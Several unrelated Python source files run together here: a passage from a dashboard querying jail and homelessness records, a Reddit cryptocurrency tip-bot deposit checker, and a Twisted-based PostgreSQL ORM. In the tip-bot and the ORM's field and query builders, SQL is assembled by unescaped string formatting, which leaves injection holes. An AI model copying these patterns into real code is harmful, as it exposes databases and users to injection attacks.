            "size": venn_diagram_stats[1]
        },
        {
            "sets": [
                "Homeless"
            ],
            "size": venn_diagram_stats[0]
        },
        {
            "sets": [
                "Jail",
                "Homeless"
            ],
            "size": venn_diagram_stats[2]
        }
    ]
    logging.info('Retrieving bar data from database')
    filtered_data = retrieve_bar_data(matched_hmis_table, matched_bookings_table, start_time, end_time)
    logging.info('Done retrieving bar data from database')
    filtered_data['tableData'] = rows_to_show
    return {
        "vennDiagramData": venn_diagram_data,
        "totalTableRows": counts_by_status.get(set_status, venn_diagram_stats[3]),
        "filteredData": filtered_data
    }


def retrieve_bar_data(matched_hmis_table, matched_bookings_table, start_time, end_time):
    query = """
    SELECT
    *,
    DATE_PART('day', {exit}::timestamp - {start}::timestamp) as days
    FROM {table_name}
    WHERE
        not ({start} < %(start_time)s AND {exit} < %(start_time)s) and
        not ({start} > %(end_time)s AND {exit} > %(end_time)s)
    """
    filtered_hmis = pd.read_sql(
        query.format(
            table_name=matched_hmis_table,
            start="client_location_start_date",
            exit="client_location_end_date"),
        con=db.engine,
        params={
            "start_time": start_time,
            "end_time": end_time
    })


    filtered_bookings = pd.read_sql(
        query.format(
            table_name=matched_bookings_table,
            start="jail_entry_date",
            exit="jail_exit_date"),
        con=db.engine,
        params={
            "start_time": start_time,
            "end_time": end_time
    })
    shared_ids = filtered_hmis[filtered_hmis.matched_id.isin(filtered_bookings.matched_id)].matched_id.unique()

    if len(shared_ids) == 0:
        logger.warning("No matched between two services")

    # Handle the case that empty query results in ZeroDivisionError
    bar_data = {
        "jailDurationBarData": get_histogram_bar_chart_data(filtered_bookings, get_days_distribution, shared_ids, 'Jail'),
        "homelessDurationBarData": get_histogram_bar_chart_data(filtered_hmis, get_days_distribution, shared_ids, 'Homeless'),
        "jailContactBarData": get_histogram_bar_chart_data(filtered_bookings, get_contact_dist, shared_ids, 'Jail'),
        "homelessContactBarData": get_histogram_bar_chart_data(filtered_hmis, get_contact_dist, shared_ids, 'Homeless'),
    }

    return bar_data


def get_task_uplaod_id(n):
    query = """
    SELECT *
    FROM (
        SELECT row_number() over (ORDER By upload_timestamp DESC) as rownumber, *
        FROM upload_log
    ) as foo
    where rownumber = %(n)s
    """
    df = pd.read_sql(
        query,
        con=db.engine,
        params={"n": n}
    )
    return df


def get_history():
    query = """
    SELECT
        upload_log.id as upload_id,
        upload_log.jurisdiction_slug,
        upload_log.event_type_slug,
        upload_log.user_id,
        upload_log.given_filename,
        upload_log.upload_timestamp,
        upload_log.num_rows,
        upload_log.file_size,
        upload_log.file_hash,
        upload_log.s3_upload_path,
        match_log.id as match_id,
        match_log.match_start_timestamp,
        match_log.match_complete_timestamp,
        to_char(match_log.runtime, 'HH24:MI:SS') as runtime
    FROM match_log
    LEFT JOIN upload_log ON upload_log.id = match_log.upload_id
    ORDER BY match_complete_timestamp ASC
    """
    df = pd.read_sql(
        query,
        con=db.engine
    )
    return df

import json
import praw
import pdb
import sys
import MySQLdb
import prawcore
from decimal import *
import subprocess
import shlex
import argparse
from utils import utils
#from tipbot import logger

class deposit():
        
    def __init__(self):
        #Set up MySQL cursor
        self.debug = 1
        self.utils = utils()
        #self.logger = logger()
        self.reddit = self.utils.connect_to_reddit()
        self.cursor = self.utils.get_mysql_cursor()

    def checks(self):
        me = reddit.user.me()

    def all_deposits(self,coin):
        sql = "SELECT * FROM deposits WHERE coin='%s'" % coin                    
        self.cursor.execute(sql)                    
        return self.cursor.fetchall()

    def get_amount_from_json(self,raw_tx,tx_in_db):
        json_tx = json.loads(raw_tx)
        return json_tx[tx_in_db]['amount']


    def check_deposits(self,username,tx_in_db,coin):
        qcheck = subprocess.check_output(shlex.split('%s/%s/bin/%s-cli listtransactions %s' % (self.utils.config['other']['full_dir'],coin,coin,username)))
        txamount = qcheck.count("amount") #TODO: This can be done a lot better.
        
        if txamount > tx_in_db:
            #We have a TX that has not been credited yet
            newtx = self.get_amount_from_json(qcheck,tx_in_db)
            if self.debug:
                print "More TXs than in DB. We have %s in DB and %s on the blockchain for %s - AMT: %s - COIN: %s" % (tx_in_db, txamount, username, newtx, coin)
            
            #self.logger.logline("Deposit: More TXs than in DB. We have %s in DB and %s on the blockchain for %s - AMT: %s" % (tx_in_db, txamount, username, newtx))
            sql = "UPDATE deposits SET txs=txs+1 WHERE username=%s AND coin=%s"
            self.cursor.execute(sql, (username,coin,))

            if coin == "garlicoin":
                sql = "UPDATE amounts SET amount=amount+%s WHERE username=%s"
                self.cursor.execute(sql, (newtx,username,))
            elif coin == "dash":
                sql = "UPDATE amounts SET dashamt=dashamt+%s WHERE username=%s"
                self.cursor.execute(sql, (newtx,username,))
            return newtx
        else:
            return 0

    def send_messages(self,recv,subject,message):
        redmsg = self.reddit.redditor(recv)
        redmsg.message(subject, message)

    def main(self):
        #Can we connect to Reddit?
        try:
            me = self.reddit.user.me()
        except:
            print("Something went wrong. Please check Reddit for details")
            sys.exit()
 
	cnt = 1
        for coin in self.utils.config['other']['cryptos'].values():
	    coin = str(coin)
            result = self.all_deposits(coin)
            for row in result:
                username = row[1]
                tx_in_db = row[3]
                amt = self.check_deposits(username,tx_in_db,coin)

                if amt != 0:
                    self.send_messages(username,"Deposit Accepted","Hi, we receieved your %s deposit of %s and it's now in your account. Please send the word balance to the bot to get your current balance if needed or PM /u/ktechmidas if something is amiss" % (coin,amt))


depob = deposit()
depob.main()

################################################################################
# MIT License
#
# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
################################################################################

from twisted.internet.defer import inlineCallbacks, returnValue

from base import Database

class PostgresqlDatabase(Database):

    JOIN = "JOIN"
    LEFT_JOIN = "LEFT JOIN"

    TYPES = {
        'BOOL': 'bool',
        'CHAR': 'varchar',
        'FLOAT': 'float',
        'INT': 'int',
        'JSON': 'jsonb',
        'DATE': 'timestamp'
    }

    def connectionError(self, f):
        print("ERROR: connecting failed with {0}".format(f.value))

    @inlineCallbacks
    def _connect(self, **kwargs):
        from txpostgres import txpostgres, reconnection
        from txpostgres.reconnection import DeadConnectionDetector

        class LoggingDetector(DeadConnectionDetector):

            def startReconnecting(self, f):
                print("ERROR: database connection is down (error: {0})"
                      .format(f.value))
                return DeadConnectionDetector.startReconnecting(self, f)

            def reconnect(self):
                print("INFO: Reconnecting...")
                return DeadConnectionDetector.reconnect(self)

            def connectionRecovered(self):
                print("INFO: connection recovered")
                return DeadConnectionDetector.connectionRecovered(self)

        self.connection = txpostgres.Connection(detector=LoggingDetector())
        d = self.connection.connect(host=kwargs['host'],
                                    database=self.name,
                                    user=kwargs['user'],
                                    password=kwargs['password'])
        d.addErrback(self.connection.detector.checkForDeadConnection)
        d.addErrback(self.connectionError)
        yield d
        print("INFO: Database connected -- %s" %self.name)

    @inlineCallbacks
    def _close(self, *args):
        try:
            if self.connection:
                yield self.connection.close()
        except Exception as err:
            print("ERROR: while closing DB connection")
            print(err)
        else:
            print("INFO: Connection close cleanly")

    @inlineCallbacks
    def runOperation(self, operation):                    
        try:
            yield self.connection.runOperation(operation)                    
        except Exception as err:
            print("ERROR: Running operation %s" %operation)                    
            print(err)

    @inlineCallbacks
    def runQuery(self, query):                    
        answer = []
        try:
            answer = yield self.connection.runQuery(query)                    
        except Exception as err:
            print("ERROR: Running query %s" %query)                    
            print(err)
            # Return special values if error. The code should be able to know
        returnValue(answer)

    def create_table_title(self, name):
        return "CREATE TABLE %s (" %(name)

    def create_table_field_end(self, current, field):
        return " %s %s);" %(current,field)

    def create_table_field(self, current, field):
        return " %s %s," %(current,field)

    def create_unique(self, current, unique):
        return " %s UNIQUE (%s)," %(current, ",".join(unique))

    def delete_table(self, table_name, cascade=True):
        operation = "DROP TABLE IF EXISTS %s"%(table_name)
        if cascade:
            operation += " CASCADE"

        operation +=";"
        return operation

    def generate_insert(self, query):

        keys = ",".join([x.encode("utf-8") for x in query.values.keys()])
        values = ",".join([x.encode("utf-8") for x in query.values.values()])                    

        str_query = ("INSERT INTO {0} ({1}) VALUES ({2})"
                    .format(query.model_class._meta.table_name, keys, values))                    

        if query.on_conflict:
            str_query += (" ON CONFLICT ({0}) DO UPDATE SET ({1}) = ({2})"
                         .format(",".join(query.on_conflict), keys, values))                    

        if query.return_id:
            str_query += " RETURNING id"

        str_query += ";"
        return str_query                    

    def generate_delete(self, query):

        where=''
        if query._where:
            i = 0
            if isinstance(query._where, str):
                where = "WHERE {0}".format(query._where)
            else:
                for value in query._where:
                    if i == 0:
                        con = "WHERE "
                    else:
                        con = " AND "
                    where += "%s %s.%s %s '%s'"%(con, value.lhs.model_class._meta.table_name, value.lhs.name, value.op, value.rhs)
                    i+=1

        query = 'DELETE FROM {0} {1};'.format(query.model_class._meta.table_name, where)
        return query

    def generate_update(self, query):

        if query.model_class._meta.primary_key:
            _id = query.values["id"]
            del query.values["id"]

        keys = ",".join([x.encode("utf-8") for x in query.values.keys()])
        values = ",".join([x.encode("utf-8") for x in query.values.values()])                    

        if query.model_class._meta.primary_key:
            str_query = ("UPDATE {0} SET ({1})=({2}) WHERE id = {3}"
                        .format(query.model_class._meta.table_name, keys, values, _id))                    
        else:
            # XXX To Do: If not id -> check if one of the field is Unique. If one is unique use it to update
            print("ERROR: Not primary key cannot update row. Need to be implemented")
            raise Exception("ERROR: Not primary key cannot update row. Need to be implemented")

        if query.return_id:
            str_query += " RETURNING id"

        str_query += ";"
        return str_query                    

    def generate_add(self, query):
        table_name = query.model_class._meta.table_name

        query = ("INSERT INTO {0} ({1}) SELECT {2} WHERE NOT EXISTS (SELECT {3} FROM {0} WHERE {3}='{5}' AND {4}='{6}');"
                .format(table_name,
                        ",".join(query.model_class._meta.sorted_fields_names),
                        ",".join([str(obj.id) for obj in query.objs]),
                        query.model_class._meta.sorted_fields_names[0],
                        query.model_class._meta.sorted_fields_names[1],
                        query.objs[0].id,
                        query.objs[1].id))
        return query

    def generate_remove(self, query):
        table_name = query.model_class._meta.table_name

        query = ("DELETE FROM {0} WHERE {1} = '{3}' AND {2}='{4}';"
                .format(table_name,
                        query.model_class._meta.sorted_fields_names[0],
                        query.model_class._meta.sorted_fields_names[1],
                        query.objs[0].id,
                        query.objs[1].id))

        return query

    def generate_select(self, queryInstance):
        target = '*'

        joint = ""
        if queryInstance._joins:
            for join in queryInstance._joins:

                # XXX To Do: Implement other join type
                joint_type = join.joint_type
                if joint_type == self.JOIN:
                    joint_type = self.JOIN
                else:
                    joint_type = self.LEFT_JOIN

                if join.dest in join.src._meta.rel_class and join.src.isForeignKey(join.src._meta.rel_class[join.dest]):
                    clause1 = "%s.%s"%(join.src._meta.table_name, join.src._meta.rel_class[join.dest].name)
                    clause2 = "%s.%s"%(join.dest._meta.table_name, join.src._meta.rel_class[join.dest].reference.name)

                elif join.src in join.dest._meta.rel_class and join.dest.isForeignKey(join.dest._meta.rel_class[join.src]):
                    clause1 = "%s.%s"%(join.src._meta.table_name, join.dest._meta.rel_class[join.src].reference.name)
                    clause2 = "%s.%s"%(join.dest._meta.table_name, join.dest._meta.rel_class[join.src].name)

                else:
                    raise Exception("Logic error")

                joint += "%s %s on (%s = %s) "%(joint_type, join.dest._meta.table_name, clause1, clause2)

        where=''
        if queryInstance._where:
            i = 0
            if isinstance(queryInstance._where, str):
                where = "WHERE {0}".format(queryInstance._where)
            else:
                where = queryInstance._where.parse()
                where = "WHERE {0}".format(where)

        end = ";"
        if queryInstance._delete:
            queryType = "DELETE"
            if queryInstance.model_class._meta.primary_key:
                end = " RETURNING id;"
        else:
            queryType = "SELECT {0}".format(",".join(target))

        query = ('{0} FROM {1} {2} {3}{4}'
                .format(queryType, queryInstance.model_class._meta.table_name,
                        joint, where, end))
        # print(query)
        return query

    def parse_select(self, query, result):
        class_list = []

        if query._joins:
            current = [None]*len(query._joins) + [None]
            models_class = {}
            rel = []
            pos = {}

            for res in result:
                start = len(query.model_class._meta.sorted_fields_names)
                curr_list = res[:start]
                i = 0

                if not models_class:
                    pos[query.model_class] = i
                    rel.append(None)

                if not str(curr_list) in models_class:
                    kwargs = dict(zip(query.model_class._meta.sorted_fields_names, curr_list))
                    last_model = query.model_class(**kwargs)
                    models_class[str(curr_list)] = {
                        "model": last_model
                    }
                    class_list.append(last_model)

                current[i] = models_class[str(curr_list)]

                for join in query._joins:
                    curr_list = res[start:start+len(join.dest._meta.sorted_fields_names)]

                    start += len(join.dest._meta.sorted_fields_names)
                    i += 1

                    if len(rel) == i:
                        pos[join.dest] = i
                        rel.append(pos[join.src])

                    if curr_list == [None]*len(join.dest._meta.sorted_fields_names):
                        current[i] = {
                            "model" : None
                        }
                        if not i in current[rel[i]]:
                            current[rel[i]][i] = {}

                        current[rel[i]][i]["None"] = current[i]
                        continue
                    else:
                        if not i in current[rel[i]] or not str(curr_list) in current[rel[i]][i]:
                            kwargs = dict(zip(join.dest._meta.sorted_fields_names, curr_list))
                            new_model = join.dest(**kwargs)
                            current[i] = {
                                "model" : new_model
                            }

                            if not i in current[rel[i]]:
                                current[rel[i]][i] = {}

                            current[rel[i]][i][str(curr_list)] = current[i]
                        else:
                            current[i] = current[rel[i]][i][str(curr_list)]
                            continue

                        current[i] = current[rel[i]][i][str(curr_list)]
                        new_model = current[i]["model"]

                        if join.src in pos:
                            if join.src._meta.many_to_many:
                                middle_table_index = rel[i]
                                index = pos[current[rel[i]]["model"].__class__]
                                x = getattr(new_model, current[rel[i]]["model"]._meta.rel_class[join.dest].related_name)
                                x.append(current[rel[index]]["model"])
                                x = getattr(current[rel[index]]["model"], current[rel[i]]["model"]._meta.rel_class[join.dest].name)
                                x.append(new_model)

                            elif not join.dest._meta.many_to_many:
                                if current[rel[i]]["model"].isForeignKey(current[rel[i]]["model"]._meta.rel_class[join.dest]):
                                    x = getattr(new_model, current[rel[i]]["model"]._meta.rel_class[join.dest].related_name)
                                    x.append(current[rel[i]]["model"])
                                    setattr(current[rel[i]]["model"], current[rel[i]]["model"]._meta.rel_class[join.dest].name, new_model)

                                elif current[rel[i]]["model"].isReferenceField(current[rel[i]]["model"]._meta.rel_class[join.dest]):
                                    x = getattr(current[rel[i]]["model"], current[rel[i]]["model"]._meta.rel_class[join.dest].name)
                                    x.append(new_model)
                                    setattr(new_model, current[rel[i]]["model"]._meta.rel_class[join.dest].related_name, current[rel[i]]["model"])
                                else:
                                    raise Exception("Here Logic error")

                        else:
                            raise Exception("Logic error")

        else:
            for res in result:
                kwargs = dict(zip(query.model_class._meta.sorted_fields_names, res))
                class_list.append(query.model_class(**kwargs))

        return class_list

    def propagate(self, model):
        print("WARNING: Ignoring propagate -- Function not set")

################################################################################
# MIT License
#
# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
################################################################################

from base import Field

class BooleanField(Field):
    TYPE = 'BOOL'

    def __init__(self, *args, **kwargs):
        super(BooleanField, self).__init__(*args, **kwargs)

    def create_field(self, name):
        field_string = "%s bool" %(str(name))
        return field_string

    def insert_format(self, value):
        value = u"'{0}'".format(value)                    
        return value

################################################################################
# MIT License
#
# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
################################################################################

from base import Field

MAX_LENGTH = 255

class CharField(Field):
    TYPE = 'CHAR'

    def __init__(self, max_length=MAX_LENGTH, *args, **kwargs):
        super(CharField, self).__init__(*args, **kwargs)
        self.max_length = max_length

    def get_db_field(self):
        if self.model_class._meta.database:
            return ("{0}({1})"
                    .format(self.model_class._meta.database.TYPES[self.TYPE],
                            self.max_length))

        return self.TYPE

    def create_field(self, name):
        field_string = ("{0} {1}({2})"
                        .format(name, self.model_class._meta.database.TYPES[self.TYPE], self.max_length))

        if self.unique:
            field_string += " UNIQUE"

        return field_string

    def insert_format(self, value):
        value = u"'{0}'".format(value)                    
        return value

################################################################################
# MIT License
#
# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
################################################################################

from base import Field

class FloatField(Field):
    TYPE = 'FLOAT'

    def __init__(self, *args, **kwargs):
        super(FloatField, self).__init__(*args, **kwargs)

    def create_field(self, name):
        field_string = "%s float" %(str(name))
        return field_string

    def insert_format(self, value):
        value = u"'{0}'".format(value)                    
        return value

################################################################################
# MIT License
#
# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
################################################################################

from base import Field
from primaryKeyField import PrimaryKeyField
from referenceField import ReferenceField

class ForeignKeyField(Field):

    def __init__(self, rel_model, reference=None, related_name=None, on_delete=False, on_update=False, *args, **kwargs):
        super(ForeignKeyField, self).__init__(*args, **kwargs)

        self.rel_model = rel_model
        self.reference = reference or rel_model._meta.fields["id"]
        self.related_name = related_name
        self.on_delete = on_delete
        self.on_update = on_update

    def add_to_model(self, model_class, name):
        self.name = name
        self.model_class = model_class

        self.related_name = self.related_name or "%ss"%(model_class._meta.name)

        model_class._meta.add_field(self)

        if self.related_name in self.rel_model._meta.fields:
            print("ERROR: Foreign key conflict")

        if self.related_name in self.rel_model._meta.reverse_rel:
            print("ERROR: Foreign key %s already exists on model %s"%(self.related_name, model_class._meta.name))

        self.model_class._meta.rel[self.name] = self
        self.model_class._meta.rel_class[self.rel_model] = self

        reference = ReferenceField(self.model_class)
        reference.add_to_model(self.rel_model, self.related_name, self.name)

    def create_field(self, name):
        _type = self.reference.get_db_field()
        field_string = "%s %s REFERENCES %s(%s)" %(self.name, _type, self.rel_model._meta.table_name, self.reference.name)

        if self.on_delete:
            field_string += " ON DELETE CASCADE"

        if self.on_update:
            field_string += " ON UPDATE CASCADE"

        if self.unique:
            field_string += " UNIQUE"

        return field_string

    def insert_format(self, value):
        value = u"'{0}'".format(value)                    
        return value

################################################################################
# MIT License
#
# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
################################################################################

from base import Field

class IntegerField(Field):
    TYPE = 'INT'

    def __init__(self, *args, **kwargs):
        super(IntegerField, self).__init__(*args, **kwargs)

    def create_field(self, name):
        field_string = "%s int" %(str(name))

        if self.unique:
            field_string += " UNIQUE"

        return field_string

    def insert_format(self, value):
        value = u"'{0}'".format(value)                    
        return value

################################################################################
# MIT License
#
# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
################################################################################

from base import Field

class JsonField(Field):
    TYPE = 'JSON'

    def __init__(self, *args, **kwargs):
        super(JsonField, self).__init__(*args, **kwargs)

    def create_field(self, name):
        field_string = ("{0} {1}"
                        .format(name,
                            self.model_class._meta.database.TYPES[self.TYPE]))

        return field_string

    def insert_format(self, value):
        value = u"'{0}'".format(value)                    
        return value                    

################################################################################
# MIT License
#
# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
################################################################################

from base import Field

class PrimaryKeyField(Field):
    name = "id"
    TYPE = 'INT'

    def __init__(self, name=None, *args, **kwargs):
        super(PrimaryKeyField, self).__init__(*args, **kwargs)

    def create_field(self, name):
        field_string = "id SERIAL PRIMARY KEY"
        return field_string

    def insert_format(self, value):
        value = u"'{0}'".format(value)                    
        return value

################################################################################
# MIT License
#
# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
################################################################################

from base import Field

class TimestampField(Field):
    TYPE = 'DATE'

    def __init__(self, *args, **kwargs):
        super(TimestampField, self).__init__(*args, **kwargs)

    def create_field(self, name):
        field_string = "%s timestamp" %(str(name))
        return field_string

    def insert_format(self, value):
        value = u"'{0}'".format(value)                    
        return value

################################################################################
# MIT License
#
# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
################################################################################

from twisted.internet.defer import inlineCallbacks, returnValue

from base import Query

class InsertQuery(Query):
    """
    Object representing an insert query
    """

    def __init__(self, model_class, values):
        super(InsertQuery, self).__init__(model_class)
        # Values to update
        self.values = values

        # XXX
        self.on_conflict = self.model_class._meta.on_conflict

        # If a model has a primary key then we will return the id
        self.return_id = self.model_class._meta.primary_key

    @inlineCallbacks
    def execute(self):
        query = self.database.generate_insert(self)                    

        # If return id. Use runQuery else use runOperation
